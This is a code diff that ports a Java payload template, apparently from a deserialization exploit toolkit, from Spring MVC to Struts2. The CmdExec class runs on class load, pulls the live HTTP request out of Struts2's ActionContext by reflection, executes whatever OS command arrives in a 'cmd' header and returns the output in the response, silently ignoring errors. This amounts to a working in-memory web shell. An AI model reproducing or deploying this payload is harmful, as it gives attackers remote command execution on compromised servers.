@@ -1,4 +1,4 @@
-package com.h2tg.ysogate.template.springmvc;
+package com.h2tg.ysogate.template.struts2;
 
 import java.io.InputStream;
 import java.io.Writer;
@@ -6,36 +6,48 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.Scanner;
 
-public class SpringMVCCmdExecTpl {
+public class CmdExec
+{
 
     private String getReqHeaderName() {
         return "cmd";
     }
 
-    public SpringMVCCmdExecTpl() throws Exception {
+    static {
+        try {
+            new CmdExec();
+        } catch (Exception e) {
+        }
+    }
+
+    public CmdExec() throws Exception {
         run();
     }
 
-    public void run() {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+    public void run(){
         try {
-            Object requestAttributes = invokeMethod(classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
-            Object request = invokeMethod(requestAttributes, "getRequest");
-            Object response = invokeMethod(requestAttributes, "getResponse");
-            Method getHeaderM = request.getClass().getMethod("getHeader", String.class);
-            String cmd = (String) getHeaderM.invoke(request, getReqHeaderName());
+            ClassLoader loader = Thread.currentThread().getContextClassLoader();
+            Class actionContextClass = Class.forName("com.opensymphony.xwork2.ActionContext", false, loader);
+            java.lang.reflect.Field filed = actionContextClass.getDeclaredField("actionContext");
+            filed.setAccessible(true);
+            ThreadLocal actionContext = (ThreadLocal) filed.get(null);
+            Object con = actionContext.get();
+            Object context = invokeMethod(con,"getContext");
+            Object request = invokeMethod(context,"get", new Class[]{String.class},new Object[]{"com.opensymphony.xwork2.dispatcher.HttpServletRequest"});
+            Object response = invokeMethod(context,"get", new Class[]{String.class},new Object[]{"com.opensymphony.xwork2.dispatcher.HttpServletResponse"});
+            String cmd = (String) invokeMethod(request,"getHeader",new Class[]{String.class},new Object[]{getReqHeaderName()});
             if (cmd != null && !cmd.isEmpty()) {
                 Writer writer = (Writer) invokeMethod(response, "getWriter");
                 writer.write(exec(cmd));
                 writer.flush();
                 writer.close();
             }
-        } catch (Exception e) {
+        }catch (Exception ignored){
         }
     }
 
 
-    private String exec(String cmd) {
+    public String exec(String cmd){
         try {
             boolean isLinux = true;
             String osType = System.getProperty("os.name");
@@ -51,7 +63,7 @@ public class SpringMVCCmdExecTpl {
                 execRes += s.next();
             }
             return execRes;
-        } catch (Exception e) {
+        }catch (Exception e){
             return e.getMessage();
         }
     }
@@ -60,7 +72,7 @@ public class SpringMVCCmdExecTpl {
         return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
     }
 
-    private Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+    private   Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
         Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
         Method method = null;
 
@@ -102,4 +114,3 @@ public class SpringMVCCmdExecTpl {
         }
     }
 }
-
